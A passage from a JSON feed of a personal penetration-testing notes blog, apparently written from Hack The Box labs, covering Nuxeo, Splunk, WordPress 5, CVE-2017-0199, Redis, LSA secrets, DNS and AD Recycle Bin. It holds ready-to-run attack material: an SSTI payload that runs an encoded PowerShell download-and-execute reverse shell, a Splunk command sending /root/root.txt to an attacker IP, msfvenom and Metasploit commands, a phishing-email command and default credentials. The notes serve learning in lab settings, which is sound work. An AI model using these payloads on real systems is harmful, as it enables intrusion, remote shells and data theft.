            "content_text": "Oveview  Collaboration system  Tech stack          Tomcat      Elasticsearch      DB (PostgreSQL, Mysql)      Version Detection  You can see copyright as well as version infromation at the bottom of login page# Version is 10.2Copyright © 2001-2022 Nuxeo and respective authors. Nuxeo Platform FT 10.2Credentials# DefaultAdministrator:Administrator# Some DB Users to trynuxeoInteresting Files and Directories# Nuxeo config. You can see DB passwords here.C:\\programdata\\nuxeo\\conf\\nuxeo.conf# Some tomcat configconf/# User settings?~/.nxshellC:\\users\\svc_account\\.nxshell\\historyC:\\users\\svc_account\\.nxshell\\shell.propertiesInteresting URL paths/nuxeo/nuxeo/login.jsp/nxserver/nxstartup.facesInteresting Database TablesusersdigestauthcontentgroupsuserinfonoteInteresting Elasticearch Datacurl 'http://localhost:9200/nuxeo-audit/_search?pretty=true'curl 'http://localhost:9200/nuxeo/_search?pretty=true'Vulnerabilities, Attacks and Exploits  Orange: How I Chained 4 Bugs(Features?) into RCE on Amazon Collaboration System  Nuxeo 10 Authentication Bypass and RCE using SSTI# HTB Hancliffe payload. Take note there is a URI parsing# vulnerability that's why there is a `/maintenance/..;/`http://hancliffe/maintenance/..;/login.jsp/pwn$%7B7+7%7D.xhtml# Another payload but with powershell encoded commandhttp://hancliffe/maintenance/..;/login.jsp/pwn$%7B%22%22.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22powershell%20-encodedcommand%20SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMANAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACcAKQA=%22,null).waitFor()%7D.xhtmlReferences  Wikipedia  GitHub - nuxeo/nuxeo: Content management platform to build modern business applications",
            "content_html": "<h2 id=\"oveview\">Oveview</h2><p><img src=\"/spindel/assets/Nuxeo/CAP-dashboard.png\" alt=\"\" /></p><ul>  <li>Collaboration system</li>  <li>Tech stack    <ul>      <li>Tomcat</li>      <li>Elasticsearch</li>      <li>DB (PostgreSQL, Mysql)</li>    </ul>  </li></ul><h2 id=\"version-detection\">Version Detection</h2><ul>  <li>You can see copyright as well as version infromation at the bottom of login page</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Version is 10.2</span>Copyright © 2001-2022 Nuxeo and respective authors. Nuxeo Platform FT 10.2</code></pre></div></div><h2 id=\"credentials\">Credentials</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Default</span>Administrator:Administrator<span class=\"c\"># Some DB Users to try</span>nuxeo</code></pre></div></div><h2 id=\"interesting-files-and-directories\">Interesting Files and Directories</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Nuxeo config. You can see DB passwords here.</span>C:<span class=\"se\">\\p</span>rogramdata<span class=\"se\">\\n</span>uxeo<span class=\"se\">\\c</span>onf<span class=\"se\">\\n</span>uxeo.conf<span class=\"c\"># Some tomcat config</span>conf/<span class=\"c\"># User settings?</span>~/.nxshellC:<span class=\"se\">\\u</span>sers<span class=\"se\">\\s</span>vc_account<span class=\"se\">\\.</span>nxshell<span class=\"se\">\\h</span>istoryC:<span class=\"se\">\\u</span>sers<span class=\"se\">\\s</span>vc_account<span class=\"se\">\\.</span>nxshell<span class=\"se\">\\s</span>hell.properties</code></pre></div></div><h2 id=\"interesting-url-paths\">Interesting URL paths</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>/nuxeo/nuxeo/login.jsp/nxserver/nxstartup.faces</code></pre></div></div><h2 id=\"interesting-database-tables\">Interesting Database Tables</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">users</span>digestauthcontent<span class=\"nb\">groups</span>userinfonote</code></pre></div></div><h2 id=\"interesting-elasticearch-data\">Interesting Elasticearch Data</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>curl <span class=\"s1\">'http://localhost:9200/nuxeo-audit/_search?pretty=true'</span>curl <span class=\"s1\">'http://localhost:9200/nuxeo/_search?pretty=true'</span></code></pre></div></div><h2 id=\"vulnerabilities-attacks-and-exploits\">Vulnerabilities, Attacks and Exploits</h2><ul>  <li><a href=\"https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html\">Orange: How I Chained 4 Bugs(Features?) into RCE on Amazon Collaboration System</a></li>  <li><a href=\"https://github.com/mpgn/CVE-2018-16341\">Nuxeo 10 Authentication Bypass and RCE using SSTI</a></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># HTB Hancliffe payload. Take note there is a URI parsing</span><span class=\"c\"># vulnerability that's why there is a `/maintenance/..;/`</span>http://hancliffe/maintenance/..<span class=\"p\">;</span>/login.jsp/pwn<span class=\"nv\">$%</span>7B7+7%7D.xhtml<span class=\"c\"># Another payload but with powershell encoded command</span>http://hancliffe/maintenance/..<span class=\"p\">;</span>/login.jsp/pwn<span class=\"nv\">$%</span>7B%22%22.getClass<span class=\"o\">()</span>.forName<span class=\"o\">(</span>%22java.lang.Runtime%22<span class=\"o\">)</span>.getMethod<span class=\"o\">(</span>%22getRuntime%22,null<span class=\"o\">)</span>.invoke<span class=\"o\">(</span>null,null<span class=\"o\">)</span>.exec<span class=\"o\">(</span>%22powershell%20-encodedcommand%20SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMANAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACcAKQA<span class=\"o\">=</span>%22,null<span class=\"o\">)</span>.waitFor<span class=\"o\">()</span>%7D.xhtml</code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://en.wikipedia.org/wiki/Nuxeo\">Wikipedia</a></li>  <li><a href=\"https://github.com/nuxeo/nuxeo\">GitHub - nuxeo/nuxeo: Content management platform to build modern business applications</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/19/nuxeo",
            
            
            
            "tags": ["rce","cms","enum","java","ssti","web"],
            
            "date_published": "2022-05-19T00:00:00+08:00",
            "date_modified": "2022-05-19T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/18/splunk-wispherer",
            "title": "Splunk Wispherer",
            "summary": "Splunk Wispherer",
            "content_text": "OverviewAuthenticated attacker can send malicuous package to splunk API and execute it. This can be done remotely or locally.Using python3 on local exploit  Convert this exploit into python3# replace functionsraw_input() --&gt; input()print \"some text\" --&gt; print(\"some text\")  Open netcat listener on attacker machine to receive the output  Upload exploit to victim machine and runpython3 PySplunkWhisperer2_local.py --port 8089 --username shaun --password Guitar123 --payload \"curl -F 'data=@/root/root.txt' http://10.10.14.26:4444\"  Sample executionReferences  Abusing Splunk Forwarders For Shells and Persistence · Eapolsniper’s Blog",
            "content_html": "<h1 id=\"overview\">Overview</h1><p>Authenticated attacker can send malicuous package to splunk API and execute it. This can be done remotely or locally.</p><h1 id=\"using-python3-on-local-exploit\">Using python3 on local exploit</h1><ul>  <li>Convert this <a href=\"https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_local.py\">exploit</a> into python3</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># replace functions</span>raw_input<span class=\"o\">()</span> <span class=\"nt\">--</span><span class=\"o\">&gt;</span> input<span class=\"o\">()</span>print <span class=\"s2\">\"some text\"</span> <span class=\"nt\">--</span><span class=\"o\">&gt;</span> print<span class=\"o\">(</span><span class=\"s2\">\"some text\"</span><span class=\"o\">)</span></code></pre></div></div><ul>  <li>Open netcat listener on attacker machine to receive the output</li>  <li>Upload exploit to victim machine and run</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>python3 PySplunkWhisperer2_local.py <span class=\"nt\">--port</span> 8089 <span class=\"nt\">--username</span> shaun <span class=\"nt\">--password</span> Guitar123 <span class=\"nt\">--payload</span> <span class=\"s2\">\"curl -F 'data=@/root/root.txt' http://10.10.14.26:4444\"</span></code></pre></div></div><ul>  <li>Sample execution</li></ul><p><img src=\"/spindel/assets/Splunk%20Wispherer/E8F96602-F53E-48EB-9F78-BE72A20830F5.png\" alt=\"\" /></p><p><img src=\"/spindel/assets/Splunk%20Wispherer/86A9D789-E1E0-42DB-B3AA-9A22562844E1.png\" alt=\"\" /></p><h1 id=\"references\">References</h1><ul>  <li><a href=\"https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/\">Abusing Splunk Forwarders For Shells and Persistence · Eapolsniper’s Blog</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/18/splunk-wispherer",
            
            
            
            "tags": ["rce","devops"],
            
            "date_published": "2022-05-18T00:00:00+08:00",
            "date_modified": "2022-05-18T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/17/wordpress-5-rce",
            "title": "Wordpress 5 RCE",
            "summary": "Wordpress 5 RCE",
            "content_text": "This attack is very complicated and hard to understand for beginners  WordPress 5.0.0 Remote Code Execution  The detailed analysis of WordPress 5.0 RCE - by Knownsec 404 team  Analysis of a WordPress Remote Code Execution Attack - Pentest-Tools.com Blog  CVE-2019-8943 exploit by v0lck3r  Metasploit Commandsuse exploit/multi/http/wp_crop_rceset rhosts 10.10.188.55set username kwheelset password cutiepie1set lhost tun0",
            "content_html": "<p><strong>This attack is very complicated and hard to understand for beginners</strong></p><ul>  <li><a href=\"https://blog.sonarsource.com/wordpress-image-remote-code-execution?redirect=rips\">WordPress 5.0.0 Remote Code Execution</a></li>  <li><a href=\"https://medium.com/@knownsec404team/the-detailed-analysis-of-wordpress-5-0-rce-a171ed719681\">The detailed analysis of WordPress 5.0 RCE - by Knownsec 404 team</a></li>  <li><a href=\"https://pentest-tools.com/blog/wordpress-remote-code-execution-exploit-cve-2019-8942/\">Analysis of a WordPress Remote Code Execution Attack - Pentest-Tools.com Blog</a></li>  <li><a href=\"https://github.com/v0lck3r/CVE-2019-8943.git\">CVE-2019-8943 exploit by v0lck3r</a></li>  <li>Metasploit Commands</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>use exploit/multi/http/wp_crop_rce<span class=\"nb\">set </span>rhosts 10.10.188.55<span class=\"nb\">set </span>username kwheel<span class=\"nb\">set </span>password cutiepie1<span class=\"nb\">set </span>lhost tun0</code></pre></div></div>",
            "url": "https://mvineza.github.io/spindel/2022/05/17/wordpress-5-rce",
            
            
            
            "tags": ["rce","wordpress","foothold","web"],
            
            "date_published": "2022-05-17T00:00:00+08:00",
            "date_modified": "2022-05-17T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/14/hta-handler-rce-cve20170199",
            "title": "HTA Handler RCE (CVE-2017-0199)",
            "summary": "HTA Handler RCE (CVE-2017-0199)",
            "content_text": "Overview  Attacker sends document with OLE to victim  Victim clicks document (or download attachment from email)  Document sends GET request to attacker IP to download a malicious HTA file. Once this file is downloaded, victim machine executes it due to logic bug of mshta.exe.Exploits  CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler - Mandiant - using RTF and Word documnets  CVE-2017-0199: New Malware Abuses PowerPoint SlidesTools  CVE-2017-0199 Python exploit toolkit  Metasploit# Generate document and run webservermsfconsole -x \"use windows/fileformat/office_word_hta; set srvhost tun0; set filename Procedures.doc; set lhost tun0; run\"# Send generated document to victim and wait for the reverse# connection in metasploitsendEmail -t nico@megabank.com -f hacker@kali.com -s reel:25 -u Procedures -o tls=no -a /home/kali/.msf4/local/Procedures.doc -m \"See attachment for procedures\"TroubleshootingThe python exploit in github didnt worked for me. When I tried to see in wireshark the network connections, I saw that victim did a GET request to attacker, but attacker didnt respond back. Probably there is something wrong on http server implemention?From other writeups, they didnt use the http server that comes up with the exploit kit but instead they used their own http server.Alternatives  You can generate HTA file via this methods# msfvenommsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f hta-psh -o msfv.hta# via nishanghttps://www.youtube.com/watch?v=ob9SgtFm6_g&amp;t=794sReferences  HTB Reel  CVE-2017-11826 Exploited in the Wild with Politically Themed RTF Document  - maybe also related as this is an RTF exploit",
            "content_html": "<h2 id=\"overview\">Overview</h2><ol>  <li>Attacker sends document with OLE to victim</li>  <li>Victim clicks document (or download attachment from email)</li>  <li>Document sends GET request to attacker IP to download a malicious HTA file. Once this file is downloaded, victim machine executes it due to logic bug of <code class=\"language-plaintext highlighter-rouge\">mshta.exe</code>.</li></ol><h2 id=\"exploits\">Exploits</h2><ul>  <li><a href=\"https://www.mandiant.com/resources/cve-2017-0199-hta-handler\">CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler - Mandiant</a> - using RTF and Word documnets</li>  <li><a href=\"https://www.trendmicro.com/en_sg/research/17/h/cve-2017-0199-new-malware-abuses-powerpoint-slide-show.html\">CVE-2017-0199: New Malware Abuses PowerPoint Slides</a></li></ul><h2 id=\"tools\">Tools</h2><ul>  <li><a href=\"https://github.com/bhdresh/CVE-2017-0199\">CVE-2017-0199 Python exploit toolkit</a></li></ul><p><img src=\"/spindel/assets/HTA%20Handler%20RCE%20(CVE-2017-0199)/Scenario1.jpg\" alt=\"\" /></p><ul>  <li>Metasploit</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Generate document and run webserver</span>msfconsole <span class=\"nt\">-x</span> <span class=\"s2\">\"use windows/fileformat/office_word_hta; set srvhost tun0; set filename Procedures.doc; set lhost tun0; run\"</span><span class=\"c\"># Send generated document to victim and wait for the reverse</span><span class=\"c\"># connection in metasploit</span>sendEmail <span class=\"nt\">-t</span> nico@megabank.com <span class=\"nt\">-f</span> hacker@kali.com <span class=\"nt\">-s</span> reel:25 <span class=\"nt\">-u</span> Procedures <span class=\"nt\">-o</span> <span class=\"nv\">tls</span><span class=\"o\">=</span>no <span class=\"nt\">-a</span> /home/kali/.msf4/local/Procedures.doc <span class=\"nt\">-m</span> <span class=\"s2\">\"See attachment for procedures\"</span></code></pre></div></div><h2 id=\"troubleshooting\">Troubleshooting</h2><p>The python exploit in github didnt worked for me. When I tried to see in wireshark the network connections, I saw that victim did a <code class=\"language-plaintext highlighter-rouge\">GET</code> request to attacker, but attacker didnt respond back. Probably there is something wrong on http server implemention?</p><p>From other writeups, they didnt use the http server that comes up with the exploit kit but instead they used their own http server.</p><h2 id=\"alternatives\">Alternatives</h2><ul>  <li>You can generate HTA file via this methods</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># msfvenom</span>msfvenom <span class=\"nt\">-p</span> windows/shell_reverse_tcp <span class=\"nv\">LHOST</span><span class=\"o\">=</span>10.10.14.3 <span class=\"nv\">LPORT</span><span class=\"o\">=</span>443 <span class=\"nt\">-f</span> hta-psh <span class=\"nt\">-o</span> msfv.hta<span class=\"c\"># via nishang</span>https://www.youtube.com/watch?v<span class=\"o\">=</span>ob9SgtFm6_g&amp;t<span class=\"o\">=</span>794s</code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB Reel</li>  <li><a href=\"https://www.fortinet.com/blog/threat-research/cve-2017-11826-exploited-in-the-wild-with-politically-themed-rtf-document\">CVE-2017-11826 Exploited in the Wild with Politically Themed RTF Document</a>  - maybe also related as this is an RTF exploit</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/14/hta-handler-rce-cve20170199",
            
            
            
            "tags": ["rce","windows","foothold"],
            
            "date_published": "2022-05-14T00:00:00+08:00",
            "date_modified": "2022-05-14T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/08/redis-4-and-5-unauthenticated-rce",
            "title": "Redis 4 and 5 Unauthenticated RCE",
            "summary": "Redis 4 and 5 Unauthenticated RCE",
            "content_text": "OverviewYou can deploy a rougue redis server and make use of its replication capabilities to execute arbritrary commands inside the server.::NOTE::Looks like this is for linux onlySteps  Download this exploit  Follow instruction on how to compile exp.so  Run it from attacker machine# 10.10.70.254 - victim ip# 10.11.40.33 - attacker ippython3 redis-master.py -r 10.10.70.254 -p 6379 -L 10.11.40.33 -P 8888 -f RedisModulesSDK/exp.so -c \"id\"  Sample output...truncated...# Clientsconnected_clients:1client_longest_output_list:0client_biggest_input_buf:0blocked_clients:0uid=112(redis) gid=123(redis) groups=123(redis)Notes  If you use reverse shell as your command, this may break the redis for some reasons. So you only have 1 chance to do it because next time it would not work.  This might not work if commands such as MODULE is not available on the target redis instanceReferences  https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf  Pavel Toporkov - Redis post-exploitation",
            "content_html": "<h1 id=\"overview\">Overview</h1><p>You can deploy a rougue redis server and make use of its replication capabilities to execute arbritrary commands inside the server.</p><p>::NOTE::</p><p>Looks like this is for linux only</p><p><img src=\"/spindel/assets/Redis%204%20and%205%20Unauthenticated%20RCE/357378FF-379F-4EFA-81F7-4A12EC11EEFC.png\" alt=\"\" /></p><h1 id=\"steps\">Steps</h1><ul>  <li>Download this <a href=\"https://github.com/vulhub/redis-rogue-getshell\">exploit</a></li>  <li>Follow instruction on how to compile <code class=\"language-plaintext highlighter-rouge\">exp.so</code></li>  <li>Run it from attacker machine</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># 10.10.70.254 - victim ip</span><span class=\"c\"># 10.11.40.33 - attacker ip</span>python3 redis-master.py <span class=\"nt\">-r</span> 10.10.70.254 <span class=\"nt\">-p</span> 6379 <span class=\"nt\">-L</span> 10.11.40.33 <span class=\"nt\">-P</span> 8888 <span class=\"nt\">-f</span> RedisModulesSDK/exp.so <span class=\"nt\">-c</span> <span class=\"s2\">\"id\"</span></code></pre></div></div><ul>  <li>Sample output</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>...truncated...# Clientsconnected_clients:1client_longest_output_list:0client_biggest_input_buf:0blocked_clients:0uid=112(redis) gid=123(redis) groups=123(redis)</code></pre></div></div><h1 id=\"notes\">Notes</h1><ul>  <li>If you use reverse shell as your command, this may break the redis for some reasons. So you only have 1 chance to do it because next time it would not work.</li>  <li>This might not work if commands such as <code class=\"language-plaintext highlighter-rouge\">MODULE</code> is not available on the target redis instance</li></ul><h1 id=\"references\">References</h1><ul>  <li>https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</li>  <li><a href=\"https://www.youtube.com/watch?v=Jmv-0PnoJ6c\">Pavel Toporkov - Redis post-exploitation</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/08/redis-4-and-5-unauthenticated-rce",
            
            
            
            "tags": ["rce","foothold"],
            
            "date_published": "2022-05-08T00:00:00+08:00",
            "date_modified": "2022-05-08T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/03/lsa-secrets",
            "title": "LSA Secrets",
            "summary": "LSA Secrets",
            "content_text": "OverviewLSA secrets is a special protected storage for important data used by the Local Security Authority (LSA) in Windows. LSA is designed for managing a system’s local security policy, auditing, authenticating, logging users on to the system, storing private data. Users’ and system’s sensitive data is stored in secrets. Access to all secret data is available to system only.LSASS (Local Security Authority Subsystem Service) is the service corresponding to this and it stores the credentials in memory on behalf of user that has an active session.LSASS may store credentials in multiple forms, including reversibly encrypted password, Kerberos tickets, NT hash, LM hash, DPAPI keys,and Smartcard PIN.Credentials are stored in LSASS for sessions that have been established since the last reboot and have not been closed. For example, credentials are created in memory when a user does any of the following (this is not an exhaustive list).  Logs on to a local session or RDP session on the computer  Runs a process using RunAs  Runs an active Windows service on the computer  Creates a scheduled task or batch job.  Runs PsExec with explicit creds, such as PsExec \\\\server -u user -p pwd cmd  Uses WinRM with CredSSP.References  Dumping LSA Secrets - Red Teaming Experiments  Windows LSA secrets  Decrypting LSA Secrets",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>LSA secrets is a special protected storage for important data used by the Local Security Authority (LSA) in Windows. LSA is designed for managing a system’s local security policy, auditing, authenticating, logging users on to the system, storing private data. Users’ and system’s sensitive data is stored in secrets. Access to all secret data is available to system only.</p><p>LSASS (Local Security Authority Subsystem Service) is the service corresponding to this and it stores the credentials in memory on behalf of user that has an active session.</p><p>LSASS may store credentials in multiple forms, including reversibly encrypted password, Kerberos tickets, NT hash, LM hash, DPAPI keys,and Smartcard PIN.</p><p>Credentials are stored in LSASS for sessions that have been established since the last reboot and have not been closed. For example, credentials are created in memory when a user does any of the following (this is not an exhaustive list).</p><ul>  <li>Logs on to a local session or RDP session on the computer</li>  <li>Runs a process using RunAs</li>  <li>Runs an active Windows service on the computer</li>  <li>Creates a scheduled task or batch job.</li>  <li>Runs PsExec with explicit creds, such as <code class=\"language-plaintext highlighter-rouge\">PsExec \\\\server -u user -p pwd cmd</code></li>  <li>Uses WinRM with CredSSP.</li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets\">Dumping LSA Secrets - Red Teaming Experiments</a></li>  <li><a href=\"https://www.passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=23\">Windows LSA secrets</a></li>  <li><a href=\"http://moyix.blogspot.com/2008/02/decrypting-lsa-secrets.html\">Decrypting LSA Secrets</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/03/lsa-secrets",
            
            
            
            "tags": ["windows","crypto"],
            
            "date_published": "2022-05-03T00:00:00+08:00",
            "date_modified": "2022-05-03T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/05/01/dns-domain-name-system",
            "title": "DNS (Domain Name System)",
            "summary": "DNS (Domain Name System)",
            "content_text": "Interesting Files# bind key/etc/bind/ddns.keyCommands# interactivenslookup&gt; server 10.10.10.161[...redacted...]&gt; 127.0.0.1           # lookup localhost[...redacted...]&gt; 127.0.0.2           # some systems have this[...redacted...]&gt; 10.10.10.161        # lookup its ip[...redacted...]Zone Transfer  Usually you can do this if DNS is running via TCP instead of UDP  You need a domain name in order for this to work  You can have clues on how many domains it holds based from failed transfer output$ dig axfr @mantis                  [...redacted...]; (1 server found)[...redacted...]$Reverse DNS# Checks loopback addresses - looks like command is no longer# validdnsrecon -n 10.10.10.83 -r 10.0.0.0/8 --db olympus.dbdnsrecon -n 10.10.10.83 -r 172.16.0.0/12 --db olympus.dbdnsrecon -n 10.10.10.83 -r 192.168.0.0/16 --db olympus.dbDynamic DNS (no-ip)# adding record setting a specific IPcurl 'http://dynadns:sndanyd@dynstr/nic/update?hostname=hacker.dnsalias.htb&amp;myip=10.10.14.45'# adding a record using IP by clientcurl 'http://dynadns:sndanyd@dynstr/nic/update?hostname=hacker.dnsalias.htb'  DDNS server implementations          php      php 2      perl      golang        API                                                      [Perform Update (RA-API)              Dyn Help Center](https://help.dyn.com/remote-access-api/perform-update/)                                          Tools  GitHub - hash3liZer/Subrake: A Subdomain Enumeration and Validation tool for Bug Bounty and Pentesters.References  53 - Pentesting DNS - HackTricks f",
            "content_html": "<h2 id=\"interesting-files\">Interesting Files</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># bind key</span>/etc/bind/ddns.key</code></pre></div></div><h2 id=\"commands\">Commands</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># interactive</span>nslookup<span class=\"o\">&gt;</span> server 10.10.10.161<span class=\"o\">[</span>...redacted...]<span class=\"o\">&gt;</span> 127.0.0.1           <span class=\"c\"># lookup localhost</span><span class=\"o\">[</span>...redacted...]<span class=\"o\">&gt;</span> 127.0.0.2           <span class=\"c\"># some systems have this</span><span class=\"o\">[</span>...redacted...]<span class=\"o\">&gt;</span> 10.10.10.161        <span class=\"c\"># lookup its ip</span><span class=\"o\">[</span>...redacted...]</code></pre></div></div><h2 id=\"zone-transfer\">Zone Transfer</h2><ul>  <li>Usually you can do this if DNS is running via TCP instead of UDP</li>  <li>You need a domain name in order for this to work</li>  <li>You can have clues on how many domains it holds based from failed transfer output</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>dig axfr @mantis                  <span class=\"o\">[</span>...redacted...]<span class=\"p\">;</span> <span class=\"o\">(</span>1 server found<span class=\"o\">)</span><span class=\"o\">[</span>...redacted...]<span class=\"err\">$</span></code></pre></div></div><h2 id=\"reverse-dns\">Reverse DNS</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Checks loopback addresses - looks like command is no longer</span><span class=\"c\"># valid</span>dnsrecon <span class=\"nt\">-n</span> 10.10.10.83 <span class=\"nt\">-r</span> 10.0.0.0/8 <span class=\"nt\">--db</span> olympus.dbdnsrecon <span class=\"nt\">-n</span> 10.10.10.83 <span class=\"nt\">-r</span> 172.16.0.0/12 <span class=\"nt\">--db</span> olympus.dbdnsrecon <span class=\"nt\">-n</span> 10.10.10.83 <span class=\"nt\">-r</span> 192.168.0.0/16 <span class=\"nt\">--db</span> olympus.db</code></pre></div></div><h2 id=\"dynamic-dns-no-ip\">Dynamic DNS (no-ip)</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># adding record setting a specific IP</span>curl <span class=\"s1\">'http://dynadns:sndanyd@dynstr/nic/update?hostname=hacker.dnsalias.htb&amp;myip=10.10.14.45'</span><span class=\"c\"># adding a record using IP by client</span>curl <span class=\"s1\">'http://dynadns:sndanyd@dynstr/nic/update?hostname=hacker.dnsalias.htb'</span></code></pre></div></div><ul>  <li>DDNS server implementations    <ul>      <li><a href=\"https://www.yingtongli.me/blog/2017/04/18/dynamic-dns.html\">php</a></li>      <li><a href=\"https://github.com/kbabioch/php-ddns/blob/master/update.php\">php 2</a></li>      <li><a href=\"https://github.com/randomnoun/ddserver\">perl</a></li>      <li><a href=\"https://github.com/benjaminbear/docker-ddns-server\">golang</a></li>    </ul>  </li>  <li>API    <ul>      <li>        <table>          <tbody>            <tr>              <td>[Perform Update (RA-API)</td>              <td>Dyn Help Center](https://help.dyn.com/remote-access-api/perform-update/)</td>            </tr>          </tbody>        </table>      </li>    </ul>  </li></ul><h2 id=\"tools\">Tools</h2><ul>  <li><a href=\"https://github.com/hash3liZer/Subrake\">GitHub - hash3liZer/Subrake: A Subdomain Enumeration and Validation tool for Bug Bounty and Pentesters.</a></li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/pentesting/pentesting-dns\">53 - Pentesting DNS - HackTricks</a> f</li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/05/01/dns-domain-name-system",
            
            
            
            "tags": ["enum","dns","network"],
            
            "date_published": "2022-05-01T00:00:00+08:00",
            "date_modified": "2022-05-01T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/04/30/ad-recycle-bin",
            "title": "AD Recycle Bin",
            "summary": "AD Recycle Bin",
            "content_text": "OverviewAttacker can retrieve juicy information from deleted AD Objects if he had gained access to a low-privileged user that has access in deleted AD objects.Environment Setup and Requirements  Low privileged user that can access deleted AD objectsSteps  Check current permission*Evil-WinRM* PS C:\\users\\arksvc&gt; whoami /all | findstr /i recycleCASCADE\\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group*Evil-WinRM* PS C:\\users\\arksvc&gt;   Check if you can see deleted objectsGet-ADObject -filter 'isDeleted -eq $true -and name -ne \"Deleted Objects\"' -includeDeletedObjects  Find juicy information45689883479503*Evil-WinRM* PS C:\\users&gt; Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties * | findstr cascadeLegacyPwdcascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz*Evil-WinRM* PS C:\\users&gt; References  HTB Cascade                              [Active Directory Recycle Bin          Recover Deleted AD Object          AD Deleted Objects](https://stealthbits.com/blog/active-directory-object-recovery-recycle-bin/)                      ACTIVE DIRECTORY OBJECT RECOVERY (RECYCLE BIN)",
